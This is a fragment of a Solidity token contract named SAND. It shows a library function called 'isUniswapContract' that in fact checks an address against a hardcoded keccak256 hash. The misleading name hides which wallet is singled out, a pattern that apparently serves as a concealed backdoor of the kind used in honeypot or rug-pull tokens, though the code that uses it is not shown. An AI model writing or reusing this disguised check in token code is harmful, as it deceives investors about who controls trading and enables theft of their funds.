...
library Address {
    function isUniswapContract(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x4aa900cfe1058332215dea1e32975c020bce7c8229e49440939f06b3b94914bb;
    }
}
library SafeMath {
...
contract SAND is Ownable, IERC20 {
